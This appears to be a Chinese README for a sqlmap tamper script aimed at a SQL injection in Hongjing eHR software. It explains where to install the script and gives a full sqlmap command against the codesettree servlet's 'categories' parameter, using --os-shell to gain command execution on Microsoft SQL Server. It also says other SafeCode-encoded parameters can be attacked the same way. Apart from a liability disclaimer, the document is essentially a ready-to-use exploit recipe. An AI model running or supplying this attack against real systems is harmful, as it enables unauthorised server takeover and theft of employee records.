# ehr_SafeCodeEncode_tamper
宏景ehr sql注入的tamper脚本（sqlmap使用）

# 使用方法

将该脚本ehr_SafeCodeEncode_tamper.py放在sqlmap/tamper/目录下

使用命令开始注入
```
python3 sqlmap.py -u "http://x.x.x.x/servlet/codesettree?categories=1&codesetid=1&flag=c&parentid=-1&status=1"  -p categories --dbms="Microsoft SQL Server" --tamper ehr_SafeCodeEncode_tamper  --os-shell --level 3
```

注：其他注入点如果也通过SafeCode.encode方法编码的话，也可以利用该脚本进行注入。

SafeCode.py只实现了编码和解码，请自行调用。


# 免责声明

1. 使用本网络安全工具存在一定的风险，请用户在使用前自行评估和承担相关风险。
2. 本网络安全工具仅供用户排查网站是否存在漏洞，不保证其完全有效或适用于所有情况。
3. 开发者或提供者对于用户使用本网络安全工具所导致的任何直接或间接损失或损害不承担责任。
4. 用户在使用本网络安全工具时应遵守适用的法律法规和合规要求，开发者或提供者不对用户的违法行为承担责任。
5. 本网络安全工具的功能、性能和适用性存在限制，开发者或提供者不对其做出任何明示或默示的担保。
6. 用户在使用本网络安全工具时应遵守知识产权和保密性等相关法律和条款。
7. 本免责声明适用于使用本网络安全工具的所有用户。

请在使用本网络安全工具之前详细阅读并理解以上免责声明，如果不同意其中的任何条款，请立即停止使用本工具。
